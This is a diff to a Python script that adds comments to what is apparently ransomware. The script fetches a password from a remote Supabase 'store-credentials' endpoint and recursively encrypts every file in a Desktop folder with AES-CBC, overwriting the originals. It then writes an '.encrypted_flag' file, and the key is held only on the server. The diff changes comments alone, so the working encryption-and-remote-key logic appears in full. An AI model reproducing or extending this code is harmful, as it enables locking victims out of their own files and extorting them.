@@ -11,6 +11,7 @@ from cryptography.hazmat.backends import default_backend
 SERVER_URL = "https://qlvtkhpjazvwfnqzoqjr.supabase.co/functions/v1/store-credentials"
 SHARED_KEY = os.getenv("EDGE_SHARED_KEY")
 
+# Generates encryption key from password and salt using PBKDF2
 def generate_key(password: str, salt: bytes) -> bytes:
     kdf = PBKDF2HMAC(
         algorithm=hashes.SHA256(), length=32, salt=salt,
@@ -18,6 +19,7 @@ def generate_key(password: str, salt: bytes) -> bytes:
     )
     return kdf.derive(password.encode())
 
+# Encrypts file content with AES-CBC, prepends salt and IV
 def encrypt_file(file_path: str, password: str):
     salt = os.urandom(16)
     key = generate_key(password, salt)
@@ -32,6 +34,7 @@ def encrypt_file(file_path: str, password: str):
 
     open(file_path, "wb").write(salt + iv + enc)
 
+# Encrypts all files in directory recursively
 def encrypt_directory(path: str, password: str):
     for root, _, files in os.walk(path):
         for f in files:
@@ -41,6 +44,7 @@ def encrypt_directory(path: str, password: str):
             except Exception as e:
                 print(f"Failed {fp}: {e}")
 
+# Stores user_id and retrieves password from server
 def store_and_get_password(user_id: str) -> str:
     if not SHARED_KEY:
         raise RuntimeError("EDGE_SHARED_KEY not set; export it first")
@@ -49,6 +53,7 @@ def store_and_get_password(user_id: str) -> str:
     r.raise_for_status()
     return r.json()["password"]
 
+# Retrieves or creates unique user ID stored in file
 def get_or_create_user_id() -> str:
     id_file = os.path.expanduser("~/.user_id")
     if os.path.exists(id_file):
@@ -66,23 +71,26 @@ def get_or_create_user_id() -> str:
 
 
 if __name__ == "__main__":
+    # Gets user ID
     user_id = get_or_create_user_id()
     print(f"User ID: {user_id}")
 
+    # Locates target folder on Desktop
     desktop = os.path.join(os.path.expanduser("~"), "Desktop")
     target_folder = os.path.join(desktop, "personal_Fa0337")
 
+    # Checks if target folder exists
     if not os.path.exists(target_folder):
         print("⚠️ Target folder not found.")
         sys.exit(0)
 
-    # Request password from server
+    # Requests password from server
     password = store_and_get_password(user_id)
 
-    # Encrypt
+    # Encrypts target folder
     print("🔐 Encrypting...")
     encrypt_directory(target_folder, password)
 
-    # Mark folder as encrypted
+    # Adds encrypted flag file
     open(os.path.join(target_folder, ".encrypted_flag"), "w").write("ENCRYPTED")
     print("✅ Encryption complete.")
